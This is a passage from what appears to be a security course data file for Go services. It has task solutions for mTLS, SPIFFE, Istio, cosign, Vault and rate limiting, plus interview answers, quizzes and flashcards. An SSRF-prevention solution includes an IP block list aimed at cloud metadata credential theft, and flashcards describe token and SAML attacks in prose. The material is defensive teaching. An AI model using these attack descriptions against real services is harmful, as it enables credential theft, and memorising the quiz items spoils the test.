  -keyout ca.key -out ca.crt -subj "/CN=Acme Mesh CA" \\
  -addext "basicConstraints=critical,CA:TRUE" -addext "keyUsage=critical,keyCertSign"

issue() { # name, extfile-content
  openssl req -new -nodes -newkey ec -pkeyopt ec_paramgen_curve:P-256 -keyout $1.key -out $1.csr -subj "/CN=$1"
  printf "$2" > $1.ext
  openssl x509 -req -in $1.csr -CA ca.crt -CAkey ca.key -CAcreateserial -days 1 -sha256 -extfile $1.ext -out $1.crt
}
issue payments "basicConstraints=CA:FALSE\\nkeyUsage=critical,digitalSignature\\nextendedKeyUsage=serverAuth\\nsubjectAltName=DNS:payments.local"
issue orders   "basicConstraints=CA:FALSE\\nkeyUsage=critical,digitalSignature\\nextendedKeyUsage=clientAuth\\nsubjectAltName=URI:spiffe://prod.example.com/ns/orders/sa/orders"
issue reports  "basicConstraints=CA:FALSE\\nkeyUsage=critical,digitalSignature\\nextendedKeyUsage=clientAuth\\nsubjectAltName=URI:spiffe://prod.example.com/ns/reports/sa/reports"

# Run the Go server from the module example (allow-list contains only the orders identity), then:
URL=https://payments.local:8443/v1/charges
R="--resolve payments.local:8443:127.0.0.1 --cacert ca.crt"
curl $R --cert orders.crt  --key orders.key  -X POST $URL -o /dev/null -w '%{http_code}\\n'   # 200
curl $R -X POST $URL                                                                       # alert certificate required
curl $R --cert reports.crt --key reports.key -X POST $URL                                 # handshake fails: identity not allowed
openssl x509 -in orders.crt -noout -ext subjectAltName,extendedKeyUsage

# Production: replace the hand-made CA with SPIRE / mesh CA / cert-manager, with hour-scale certs and auto-rotation.`,
          lang: 'bash'
        },
        {
          t: 'Fix an SSRF vulnerability in a URL-preview feature',
          d: 'medium',
          type: 'coding',
          hint: `<ul><li>Validate scheme (http/https) and port; but the real check must happen on the <em>resolved IP at connect time</em> (DNS rebinding).</li><li>Use <code>net.Dialer.Control</code> to block loopback, private, link-local (metadata), CGNAT, multicast, unspecified.</li><li>Disable proxy env, limit redirects, response size and time; enforce IMDSv2 on nodes.</li></ul>`,
          solution: `var cgnat = netip.MustParsePrefix("100.64.0.0/10")

func blocked(ip netip.Addr) bool {
    ip = ip.Unmap()
    return ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() || ip.IsLinkLocalMulticast() ||
        ip.IsMulticast() || ip.IsUnspecified() || cgnat.Contains(ip)
    // IsLinkLocalUnicast covers 169.254.169.254; IsPrivate covers fd00:ec2::254 (AWS IPv6 IMDS)
}

func NewSafeClient() *http.Client {
    dialer := &net.Dialer{
        Timeout: 5 * time.Second,
        Control: func(network, address string, _ syscall.RawConn) error { // runs after DNS resolution, per connection
            host, port, err := net.SplitHostPort(address)
            if err != nil {
                return err
            }
            ip, err := netip.ParseAddr(host)
            if err != nil || blocked(ip) || (port != "80" && port != "443") {
                return fmt.Errorf("ssrf: destination %s not allowed", address)
            }
            return nil
        },
    }
    return &http.Client{
        Timeout: 10 * time.Second,
        Transport: &http.Transport{
            Proxy:                 nil, // ignore HTTP(S)_PROXY env
            DialContext:           dialer.DialContext,
            TLSHandshakeTimeout:   5 * time.Second,
            ResponseHeaderTimeout: 5 * time.Second,
        },
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            if len(via) >= 3 || (req.URL.Scheme != "http" && req.URL.Scheme != "https") {
                return errors.New("redirect not allowed")
            }
            return nil // each redirect hop still goes through dialer.Control
        },
    }
}

func Preview(ctx context.Context, c *http.Client, raw string) ([]byte, error) {
    u, err := url.Parse(raw)
    if err != nil || (u.Scheme != "http" && u.Scheme != "https") || u.User != nil {
        return nil, errors.New("invalid url")
    }
    req, _ := http.NewRequestWithContext(ctx, http.MethodGet, u.String(), nil)
    res, err := c.Do(req)
    if err != nil {
        return nil, err
    }
    defer res.Body.Close()
    return io.ReadAll(io.LimitReader(res.Body, 512<<10)) // cap response size
}
// Infra: run the fetcher in an isolated namespace with egress via proxy; IMDSv2 (hop limit 1); no IAM role.`,
          lang: 'go'
        },
        {
          t: 'Enforce strict mTLS and service-to-service authorization in Istio',
          d: 'medium',
          type: 'hands-on',
          hint: `<ul><li>Start with PERMISSIVE, check that all traffic is mTLS (Kiali / metrics), then switch to STRICT.</li><li>AuthorizationPolicy: default deny in the namespace, then ALLOW per caller principal, method and path.</li><li>Test from an allowed and a non-allowed service account, and from a pod outside the mesh.</li></ul>`,
          solution: `# 1) Strict mTLS mesh-wide (after verifying no plaintext callers remain)
kubectl apply -f - <<'EOF'
apiVersion: security.istio.io/v1
kind: PeerAuthentication
metadata: { name: default, namespace: istio-system }
spec: { mtls: { mode: STRICT } }
EOF

# 2) Default deny in payments, then explicit allow (see module example for the ALLOW policy)
kubectl apply -f - <<'EOF'
apiVersion: security.istio.io/v1
kind: AuthorizationPolicy
metadata: { name: deny-all, namespace: payments }
spec: {}
EOF
kubectl apply -f payments-allow-orders.yaml

# 3) Verify
kubectl exec -n orders deploy/orders -c orders -- curl -s -o /dev/null -w '%{http_code}\\n' \\
  -X POST http://payments.payments.svc:8080/v1/charges                          # 200
kubectl exec -n reports deploy/reports -c reports -- curl -s -w '%{http_code}\\n' \\
  -X POST http://payments.payments.svc:8080/v1/charges                          # 403 RBAC: access denied
kubectl run nomesh --rm -it -n default --image=curlimages/curl --labels=sidecar.istio.io/inject=false -- \\
  curl -s -m 3 http://payments.payments.svc:8080/v1/charges                    # connection reset (plaintext rejected)

istioctl x describe pod $(kubectl get pod -n payments -l app=payments -o name | head -1 | cut -d/ -f2) -n payments`,
          lang: 'bash'
        },
        {
          t: 'Authorize peers by SPIFFE ID with go-spiffe',
          d: 'medium',
          type: 'coding',
          hint: `<ul><li><code>workloadapi.NewX509Source</code> connects to the SPIRE agent socket and auto-rotates SVIDs and bundles.</li><li><code>tlsconfig.MTLSServerConfig(source, source, tlsconfig.AuthorizeID(...))</code> / <code>MTLSClientConfig</code>.</li><li>Get the caller's ID in handlers for audit and finer authorization.</li></ul>`,
          solution: `import (
    "github.com/spiffe/go-spiffe/v2/spiffeid"
    "github.com/spiffe/go-spiffe/v2/spiffetls/tlsconfig"
    "github.com/spiffe/go-spiffe/v2/svid/x509svid"
    "github.com/spiffe/go-spiffe/v2/workloadapi"
)

func main() {
    ctx := context.Background()
    source, err := workloadapi.NewX509Source(ctx,
        workloadapi.WithClientOptions(workloadapi.WithAddr("unix:///run/spire/agent-sockets/api.sock")))
    if err != nil {
        log.Fatal(err)
    }
    defer source.Close()

    orders := spiffeid.RequireFromString("spiffe://prod.example.com/ns/orders/sa/orders")
    mux := http.NewServeMux()
    mux.HandleFunc("POST /v1/charges", func(w http.ResponseWriter, r *http.Request) {
        id, _ := x509svid.IDFromCert(r.TLS.PeerCertificates[0])
        slog.InfoContext(r.Context(), "charge", "caller", id.String())
        w.WriteHeader(http.StatusCreated)
    })
    srv := &http.Server{
        Addr:              ":8443",
        Handler:           mux,
        TLSConfig:         tlsconfig.MTLSServerConfig(source, source, tlsconfig.AuthorizeID(orders)),
        ReadHeaderTimeout: 5 * time.Second,
    }
    log.Fatal(srv.ListenAndServeTLS("", "")) // certs come from the X509Source and rotate automatically
}

// Client (in orders):
// payments := spiffeid.RequireFromString("spiffe://prod.example.com/ns/payments/sa/payments")
// tr := &http.Transport{TLSClientConfig: tlsconfig.MTLSClientConfig(source, source, tlsconfig.AuthorizeID(payments))}`,
          lang: 'go'
        },
        {
          t: 'Sign container images with cosign and enforce signatures at admission',
          d: 'medium',
          type: 'hands-on',
          hint: `<ul><li>CI: keyless <code>cosign sign</code> by digest with the workflow's OIDC token; attach SBOM attestation.</li><li>Cluster: Kyverno <code>verifyImages</code> (or Sigstore policy-controller) requiring your workflow identity and issuer.</li><li>Test that an unsigned image and an image signed by another identity are rejected.</li></ul>`,
          solution: `# GitHub Actions job permissions: { contents: read, packages: write, id-token: write }
# steps: build+push -> digest=$(docker buildx imagetools inspect ... --format '{{json .Manifest.Digest}}')
cosign sign --yes ghcr.io/acme/orders@$DIGEST

# Kyverno policy
kubectl apply -f - <<'EOF'
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata: { name: verify-acme-images }
spec:
  validationFailureAction: Enforce        # newer Kyverno versions also support per-rule failureAction
  webhookTimeoutSeconds: 30
  rules:
  - name: require-acme-signature
    match: { any: [ { resources: { kinds: ["Pod"] } } ] }
    verifyImages:
    - imageReferences: ["ghcr.io/acme/*"]
      mutateDigest: true                   # pin tags to verified digests
      attestors:
      - entries:
        - keyless:
            subject: "https://github.com/acme/*/.github/workflows/release.yml@refs/tags/*"
            issuer: "https://token.actions.githubusercontent.com"
            rekor: { url: "https://rekor.sigstore.dev" }
EOF

# Tests
kubectl run ok  --image=ghcr.io/acme/orders@$DIGEST          # admitted
kubectl run bad --image=ghcr.io/acme/orders:unsigned-dev      # denied: no matching signatures
kubectl run alt --image=ghcr.io/acme/orders@$FORK_DIGEST       # denied: subject mismatch (signed by a fork workflow)`,
          lang: 'bash'
        },
        {
          t: 'Implement distributed rate limiting for an API gateway',
          d: 'hard',
          type: 'design',
          hint: `<ul><li>Token bucket per (tenant, key, route-class) in Redis via an atomic Lua script; use Redis server time.</li><li>Layering: local in-process limiter for cheap pre-filtering, global Redis limiter for fairness; edge/WAF for volumetric DDoS.</li><li>Failure mode when Redis is down (fail-open with local limits vs fail-closed); headers and 429 semantics; cost-based limits.</li></ul>`,
          solution: `-- token_bucket.lua  KEYS[1]=bucket  ARGV: rate_per_sec, burst, cost
local t = redis.call('TIME')
local now = tonumber(t[1]) * 1000 + math.floor(tonumber(t[2]) / 1000)
local rate, burst, cost = tonumber(ARGV[1]), tonumber(ARGV[2]), tonumber(ARGV[3])
local b = redis.call('HMGET', KEYS[1], 'tokens', 'ts')
local tokens = tonumber(b[1]) or burst
local ts = tonumber(b[2]) or now
tokens = math.min(burst, tokens + (now - ts) / 1000 * rate)
local allowed = 0
if tokens >= cost then tokens = tokens - cost; allowed = 1 end
redis.call('HSET', KEYS[1], 'tokens', tokens, 'ts', now)
redis.call('PEXPIRE', KEYS[1], math.ceil(burst / rate * 1000) + 1000)
local retry_ms = 0
if allowed == 0 then retry_ms = math.ceil((cost - tokens) / rate * 1000) end
return {allowed, math.floor(tokens), retry_ms}

Design:
  Keys: rl:{tenant}:{api_key}:{route_class}; limits from plan (free 10 rps, pro 100 rps), cost per route (search=5)
  Gateway (Go): EVALSHA per request (~0.3 ms); Redis Cluster with hash tags {tenant} for locality
  Local pre-limiter (golang.org/x/time/rate) per instance to absorb bursts and protect Redis
  Redis unavailable: fall back to local limits (limit/instances) and alert - availability over precision
  Responses: 429 + Retry-After + RateLimit headers; log and meter rejections per tenant
  Abuse: separate stricter limits on login/signup/checkout (API6) with bot detection signals
  DDoS: volumetric protection at CDN/WAF, not in the app tier`,
          lang: 'text'
        },
        {
          t: 'Replace static database passwords with Vault dynamic credentials',
          d: 'hard',
          type: 'design',
          hint: `<ul><li>Auth: Kubernetes service-account login to Vault (no bootstrap secret).</li><li>Database secrets engine issues per-pod users with 1 h TTL; the app renews the lease or reconnects with new credentials.</li><li>Go: rebuild the connection pool on credential change; set <code>ConnMaxLifetime</code> below the TTL.</li><li>Migration: run old and new credentials in parallel, then revoke the static password.</li></ul>`,
          solution: `Architecture
  Pod (SA orders) -> Vault Agent sidecar / CSI provider (k8s auth, role "orders")
                  -> renders /vault/secrets/db.json {username, password, lease_id, ttl} and renews the lease
  Vault database engine (role orders-rw, default_ttl 1h, max_ttl 24h) -> CREATE ROLE ... VALID UNTIL ...

Go application
  - Watch /vault/secrets/db.json (poll 30s); on change: open a new *sql.DB with new creds, atomically swap,
    close the old pool after in-flight queries finish (db.Close waits for idle conns).
  - db.SetConnMaxLifetime(30 * time.Minute) < TTL, so connections never outlive their credentials.
  - Health check fails if credentials are older than max_ttl (rendering broke).

Migration steps
  1. Configure Vault DB engine with a dedicated admin user; rotate-root so only Vault knows it.
  2. Deploy app version that supports file-based, hot-swapped credentials (still using static secret).
  3. Switch the source to Vault in staging, then canary in prod; monitor connection errors, lease renew failures.
  4. Revoke the old static user; scan repos/CI for the old password; update runbooks.
Benefits: unique, short-lived, attributable credentials per pod; leaked creds expire in <= 1h; DB audit shows which pod.`,
          lang: 'text'
        },
        {
          t: 'Design zero-trust service-to-service security for a microservices platform',
          d: 'hard',
          type: 'design',
          hint: `<ul><li>Identity: SPIFFE IDs via mesh/SPIRE; workload identity to cloud; no static secrets.</li><li>Authentication: STRICT mTLS; end-user context via token exchange or verified JWT propagation.</li><li>Authorization: mesh L4/L7 policies + in-service object-level checks; default deny; egress control.</li><li>Supply chain and secrets; observability and incident response.</li></ul>`,
          solution: `1. Workload identity: Istio ambient (or SPIRE) issues spiffe://prod.example.com/ns/{ns}/sa/{sa} certs, 24h TTL,
   auto-rotated; identity tied to K8s service accounts created per service (never "default").
2. Transport: PeerAuthentication STRICT everywhere; plaintext only for explicitly exempted health ports.
3. Service authorization: namespace default-deny AuthorizationPolicies; ALLOW rules per caller principal + method +
   path, generated from a reviewed "service dependency" manifest in Git (CODEOWNERS = owning team).
4. User context: gateway validates external OAuth tokens, then token-exchanges for short-lived internal JWTs
   (aud per service, act claim); services verify JWT locally and do object-level authz (tenant + ReBAC).
5. Network: Kubernetes NetworkPolicies default-deny as a second layer; egress gateway with allow-listed domains;
   SSRF-safe HTTP clients.
6. Cloud access: EKS Pod Identity / GKE WIF per service account, least-privilege IAM; Vault dynamic DB creds.
7. Supply chain: only cosign-signed images from CI (Kyverno verifyImages), SBOM + SLSA provenance, digest pinning.
8. Runtime: Pod Security Admission "restricted", read-only root FS, seccomp RuntimeDefault, Falco/Tetragon alerts.
9. Observability: mesh telemetry with source/destination identities; alert on denied requests and new edges in the
   service graph; audit logs to SIEM.
10. Rollout: PERMISSIVE -> measure -> STRICT per namespace; AuthorizationPolicies in dry-run (AUDIT) first.`,
          lang: 'text'
        }
      ],
      interviewFocus: [
        {
          q: 'Explain mTLS: how does it differ from TLS and what must the server still do after the handshake?',
          a: `<p>In TLS only the server authenticates with a certificate. In <strong>mTLS</strong> the server sends a <code>CertificateRequest</code>; the client replies with its certificate chain and a <code>CertificateVerify</code> signature over the handshake transcript, proving possession of its private key. The server validates that chain against a dedicated client CA pool (EKU <code>clientAuth</code>, validity).</p>
<p>That gives <strong>authentication</strong> of both workloads and an encrypted channel. The server must still <strong>authorize</strong>: extract the identity (SPIFFE ID in the URI SAN) and check it against policy (which services may call which endpoints), and pass it to the application for audit and finer checks. Otherwise any workload with a certificate from the CA can call anything.</p>
<p>Operational keys: short-lived certificates with automatic rotation (SPIRE, mesh CA), hot reload of trust bundles, careful handling at TLS-terminating proxies (forward identity in a sanitized XFCC header), and fail-closed configuration (<code>RequireAndVerifyClientCert</code>, never <code>InsecureSkipVerify</code>).</p>`
        },
        {
          q: 'How does SPIFFE/SPIRE issue identities to workloads without bootstrap secrets?',
          a: `<ol>
<li>The <strong>SPIRE server</strong> holds the signing CA (or chains to an upstream CA) and registration entries mapping selectors to SPIFFE IDs (e.g. <code>k8s:ns:orders</code> + <code>k8s:sa:orders</code> &rarr; <code>spiffe://prod.example.com/ns/orders/sa/orders</code>).</li>
<li><strong>Node attestation</strong>: each SPIRE agent proves its node identity using platform evidence (Kubernetes projected SA token validated via TokenReview, AWS instance identity document, GCP IIT, TPM).</li>
<li><strong>Workload attestation</strong>: a workload connects to the agent's Unix-socket Workload API; the agent identifies the caller from the kernel (PID &rarr; cgroup &rarr; container) and kubelet (pod, SA, labels, image), and matches selectors.</li>
<li>The agent hands out an <strong>X.509-SVID</strong> (and/or JWT-SVID) plus trust bundle, short-lived (minutes to hours), and pushes rotations automatically.</li>
<li><strong>Federation</strong> shares bundles across trust domains for cross-cluster or cross-company mTLS.</li>
</ol>
<p>Result: identities derive from verifiable platform facts, not secrets copied into configs; compromised credentials expire quickly. Service meshes (Istio) provide a similar model with SPIFFE-format IDs.</p>`
        },
        {
          q: 'How would you manage secrets for services running on Kubernetes?',
          a: `<ul>
<li><strong>Source of truth</strong> outside the cluster: Vault/OpenBao or the cloud secret manager, accessed via <strong>workload identity</strong> (K8s SA &rarr; Vault Kubernetes auth or cloud IAM) — no bootstrap secrets.</li>
<li><strong>Delivery</strong>: Secrets Store CSI driver or Vault Agent mounting files (or External Secrets Operator syncing into K8s Secrets when native Secrets are required). Prefer files over env vars; apps hot-reload.</li>
<li><strong>etcd protection</strong>: encryption at rest with a KMS v2 provider; strict RBAC on <code>secrets</code> (list = read); no secret access for CI identities that don't need it.</li>
<li><strong>Short-lived and rotated</strong>: dynamic DB credentials, automated rotation with dual-secret overlap for static ones.</li>
<li><strong>GitOps</strong>: SOPS or Sealed Secrets — never plaintext in Git; secret scanning with push protection.</li>
<li><strong>Audit and response</strong>: access logs, alerts on unusual reads, a leak runbook (revoke, rotate, investigate usage).</li>
</ul>`
        },
        {
          q: 'How do you secure the software supply chain for a Go service?',
          a: `<ul>
<li><strong>Source</strong>: protected branches, required reviews, signed commits for releases, CODEOWNERS on CI configs.</li>
<li><strong>Dependencies</strong>: few, reviewed dependencies; <code>go.sum</code> + checksum DB; Renovate for updates; <code>govulncheck</code> in CI; GitHub Actions pinned by commit SHA.</li>
<li><strong>Build</strong>: hosted, ephemeral runners; least-privilege tokens; reproducible builds (<code>-trimpath</code>); SLSA provenance generated by the build platform (target L3).</li>
<li><strong>Artifacts</strong>: minimal/distroless images, SBOM (CycloneDX/SPDX) attached as attestation, <strong>keyless cosign signatures</strong> tied to the release workflow identity and logged in Rekor.</li>
<li><strong>Deploy</strong>: admission control verifies signatures/attestations and pins digests; vulnerability gates with VEX to reduce noise.</li>
<li><strong>Runtime</strong>: continuous rescanning of SBOMs against new CVEs so you know where a new vulnerability is deployed within minutes.</li>
</ul>`
        },
        {
          q: 'Explain SSRF and how you defend against it in a cloud environment.',
          a: `<p><strong>Server-Side Request Forgery</strong>: the attacker makes your server send requests to a destination of their choice — internal services, admin endpoints, or the cloud <strong>metadata service</strong> (<code>169.254.169.254</code>) that returns IAM credentials (the 2019 Capital One breach). Entry points: URL previews, webhooks, PDF renderers, image imports, XML external entities.</p>
<p>Defenses in layers:</p>
<ul>
<li><strong>Application</strong>: allow-list destinations where possible; only http/https; resolve DNS and validate the <em>connected</em> IP (Go <code>net.Dialer.Control</code>) blocking loopback, private, link-local, CGNAT — this defeats DNS rebinding and redirects to internal hosts; limit redirects, size and time; don't return raw responses/errors to the user.</li>
<li><strong>Network</strong>: run fetchers in an isolated segment with an egress proxy and allow-list; NetworkPolicies blocking internal ranges.</li>
<li><strong>Cloud</strong>: enforce <strong>IMDSv2</strong> (session tokens, hop limit 1 so containers can't reach it), use pod-level workload identity rather than node roles, give the fetcher no IAM permissions.</li>
<li><strong>Detection</strong>: log outbound requests and alert on attempts to internal ranges.</li>
</ul>`
        }
      ],
      quiz: [
        { q: 'Which Go tls.Config setting both requires and verifies client certificates?', a: 'ClientAuth: tls.RequireAndVerifyClientCert together with a ClientCAs pool.' },
        { q: 'What does a SPIFFE ID look like and where is it stored in an X.509-SVID?', a: 'A URI like spiffe://trust-domain/path (e.g. spiffe://prod.example.com/ns/orders/sa/orders), stored in the certificate\'s URI Subject Alternative Name.' },
        { q: 'What does Istio PeerAuthentication mode STRICT do?', a: 'Requires mutual TLS for all inbound traffic to the selected workloads, rejecting plaintext connections.' },
        { q: 'Are Kubernetes Secrets encrypted by default?', a: 'No. They are base64-encoded in etcd unless encryption at rest (ideally with a KMS provider) is configured.' },
        { q: 'In keyless cosign signing, what do Fulcio and Rekor do?', a: 'Fulcio issues a short-lived certificate bound to the signer\'s OIDC identity; Rekor is the transparency log recording the signature.' },
        { q: 'What is API4:2023 in the OWASP API Security Top 10?', a: 'Unrestricted Resource Consumption — missing rate limits, quotas and size/time limits.' },
        { q: 'Why must SSRF IP checks happen at connect time rather than on the URL string?', a: 'Hostnames can resolve (or re-resolve via DNS rebinding or redirects) to internal IPs; only the actual connected address is trustworthy.' },
        { q: 'Which Go package auto-escapes output by context to prevent XSS?', a: 'html/template.' }
      ],
      resources: [
        { title: 'SPIFFE — Overview and concepts', url: 'https://spiffe.io/docs/latest/spiffe-about/overview/', type: 'docs' },
        { title: 'OWASP API Security Top 10 (2023)', url: 'https://owasp.org/API-Security/editions/2023/en/0x11-t10/', type: 'docs' },
        { title: 'OWASP Secrets Management Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html', type: 'docs' },
        { title: 'OWASP Server-Side Request Forgery Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html', type: 'docs' }
      ]
    }
  ],
  flashcards: [
    { q: 'AuthN vs AuthZ vs accounting?', a: 'Authentication proves who you are; authorization decides what you may do; accounting/auditing records what you did.', d: 1 },
    { q: '401 vs 403?', a: '401 = missing or invalid credentials (send WWW-Authenticate); 403 = authenticated but not permitted (or 404 to hide existence).', d: 1 },
    { q: 'What does STRIDE stand for?', a: 'Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege.', d: 1 },
    { q: 'Zero trust in one sentence?', a: 'No implicit trust from network location: every request is authenticated, authorized and encrypted based on identity and context, per request.', d: 2 },
    { q: 'Preferred password hashing algorithm and OWASP baseline?', a: 'Argon2id with m=19 MiB, t=2, p=1 (scrypt or bcrypt cost >= 10 as alternatives; PBKDF2 600k only for FIPS).', d: 2 },
    { q: 'Salt vs pepper?', a: 'Salt: random, per-password, stored with the hash. Pepper: secret shared across hashes, stored outside the DB (KMS).', d: 1 },
    { q: 'Why are passkeys phishing-resistant?', a: 'The browser binds credentials to the relying party ID/origin and signs a challenge plus origin; look-alike domains cannot obtain or relay a valid assertion.', d: 2 },
    { q: 'Why is SMS a weak second factor?', a: 'SIM swap, SS7 interception and real-time phishing relays; NIST classifies it as a restricted authenticator.', d: 1 },
    { q: 'Secure session cookie attributes?', a: '__Host- prefix, Secure, HttpOnly, SameSite=Lax (or Strict), Path=/, no Domain, server-enforced idle and absolute timeouts.', d: 1 },
    { q: 'How do you prevent session fixation?', a: 'Issue a brand-new session ID on login and every privilege change; never accept client-chosen IDs.', d: 2 },
    { q: 'Name three CSRF defenses.', a: 'SameSite cookies, synchronizer or signed double-submit tokens, and Fetch Metadata/Origin checks (Go 1.25 http.CrossOriginProtection).', d: 2 },
    { q: 'What is the BFF pattern?', a: 'A Backend-for-Frontend acts as a confidential OAuth client, keeps tokens server-side, and gives the SPA only an HttpOnly session cookie.', d: 2 },
    { q: 'Minimum JWT validation checklist?', a: 'Algorithm allow-list, key from trusted JWKS by kid, signature, exp/nbf/iat with leeway, exact iss, aud contains this API, typ (at+jwt), then scopes.', d: 2 },
    { q: 'What is the RS256-to-HS256 key confusion attack?', a: 'Attacker signs an HS256 token using the server\'s public RSA key as the HMAC secret; vulnerable libraries let the token choose the algorithm.', d: 3 },
    { q: 'Refresh token rotation with reuse detection?', a: 'Each refresh returns a new token and invalidates the old; presenting an already-used token revokes the whole token family.', d: 2 },
    { q: 'How do you revoke stateless JWTs?', a: 'Short TTLs plus revocable refresh tokens, jti denylist, per-user cut-off timestamp, or introspection for high-risk calls; key rotation as last resort.', d: 3 },
    { q: 'Authorization Code + PKCE in one line?', a: 'Client sends code_challenge=S256(verifier) on /authorize and the verifier on /token, so an intercepted code cannot be redeemed.', d: 2 },
    { q: 'What does OAuth 2.1 remove or require?', a: 'Removes implicit and password grants; requires PKCE, exact redirect URI matching, and rotated or sender-constrained refresh tokens for public clients.', d: 2 },
    { q: 'Which grant for machine-to-machine, devices and on-behalf-of?', a: 'Client credentials; device authorization grant (RFC 8628); token exchange (RFC 8693).', d: 2 },
    { q: 'ID token vs access token?', a: 'ID token: JWT for the client (aud = client_id) describing the authentication. Access token: for the API (aud = resource), carries scopes. Never send ID tokens to APIs.', d: 1 },
    { q: 'state vs nonce vs PKCE?', a: 'state stops callback CSRF (client checks), nonce binds the ID token to the request (client checks), PKCE stops code interception (AS checks).', d: 3 },
    { q: 'How should a user be keyed in OIDC?', a: 'By the (iss, sub) pair, never by email or username.', d: 1 },
    { q: 'What is OIDC back-channel logout?', a: 'The OP POSTs a signed logout token (sid/sub, events claim, no nonce) server-to-server to each RP, which deletes matching sessions.', d: 3 },
    { q: 'What is XML Signature Wrapping?', a: 'A SAML attack where the signed assertion is moved and a forged unsigned one is placed where the app reads; fix by consuming only the verified element.', d: 3 },
    { q: 'SAML vs OIDC in one line?', a: 'SAML: XML assertions via browser POST, enterprise web SSO. OIDC: JSON/JWT on OAuth 2.0, works for web, mobile and APIs; preferred for new builds.', d: 2 },
    { q: 'What is SCIM used for?', a: 'Standard REST provisioning (RFC 7643/7644) so IdPs create, update and deactivate users and groups in apps — closing the deprovisioning gap of SSO.', d: 2 },
    { q: 'RBAC vs ABAC vs ReBAC?', a: 'RBAC: roles to permissions. ABAC: policies over subject/resource/environment attributes. ReBAC: permissions from relationships (Zanzibar, OpenFGA, SpiceDB).', d: 2 },
    { q: 'Top defense against BOLA/IDOR?', a: 'Take tenant/user from the verified token and scope every data query by it (plus RLS as backstop and cross-tenant tests); IDs are not authorization.', d: 2 },
    { q: 'Hash vs HMAC vs signature?', a: 'Hash: integrity, no key. HMAC: authenticity with a shared key. Signature: authenticity + non-repudiation with a private key, verifiable by anyone.', d: 1 },
    { q: 'AES-GCM golden rule?', a: 'Never reuse a nonce with the same key; use 96-bit random nonces with key rotation (< 2^32 messages), counters, or GCM-SIV/XChaCha20.', d: 2 },
    { q: 'Envelope encryption?', a: 'Encrypt data with a DEK locally; wrap the DEK with a KMS-held KEK; store the wrapped DEK with the ciphertext. Enables rotation by re-wrapping and crypto-shredding.', d: 2 },
    { q: 'TLS 1.3 handshake in brief?', a: 'ClientHello+key_share -> ServerHello+key_share -> encrypted EncryptedExtensions, Certificate, CertificateVerify, Finished -> client Finished. 1-RTT, always forward secret.', d: 2 },
    { q: 'Why is certificate revocation considered broken?', a: 'OCSP soft-fails, leaks privacy and adds latency; the ecosystem moved to CRLs pushed by browsers and short-lived certificates (47-day max by 2029).', d: 3 },
    { q: 'mTLS: what remains after the handshake succeeds?', a: 'Authorization: check the peer identity (e.g. SPIFFE ID in the URI SAN) against policy; a valid chain only proves authentication.', d: 2 },
    { q: 'Keyless cosign signing in one line?', a: 'CI OIDC identity -> Fulcio short-lived cert -> signature logged in Rekor; verifiers check certificate identity and OIDC issuer.', d: 3 },
    { q: 'Bearer vs sender-constrained token?', a: 'A bearer token works for whoever holds it; a sender-constrained token (DPoP cnf.jkt or mTLS cnf.x5t#S256) also requires proof of the bound private key on every use, so stolen copies cannot be replayed.', d: 2 },
    { q: 'What does a resource server check in a DPoP proof?', a: 'Signature with the embedded public JWK (asymmetric alg), typ dpop+jwt, htm/htu match the request, fresh iat, unseen jti, ath = hash of the access token, and JWK thumbprint = token cnf.jkt.', d: 3 },
    { q: 'PAR and RAR in one line each?', a: 'PAR (RFC 9126): push authorization parameters over an authenticated back channel and send only a request_uri through the browser. RAR (RFC 9396): authorization_details for fine-grained, per-transaction consent.', d: 2 },
    { q: 'Missing intermediate: why does it work on a laptop but fail in prod?', a: 'Go on macOS/Windows (system roots) uses the OS verifier, which may fetch the intermediate via AIA; Go on Linux uses its own verifier and fails. Serve the full chain and test from a Linux container.', d: 3 },
    { q: 'What is X25519MLKEM768?', a: 'The hybrid post-quantum TLS key exchange (classical X25519 + ML-KEM-768), default in Go 1.24+, major browsers and OpenSSL 3.5; it defeats harvest-now-decrypt-later while staying safe if either part is broken.', d: 2 },
    { q: 'What changed in the OWASP Top 10:2025?', a: 'Broken Access Control stays #1 and absorbs SSRF; Security Misconfiguration rises to #2; Software Supply Chain Failures (#3) and Mishandling of Exceptional Conditions (#10) are new.', d: 2 }
  ]
});
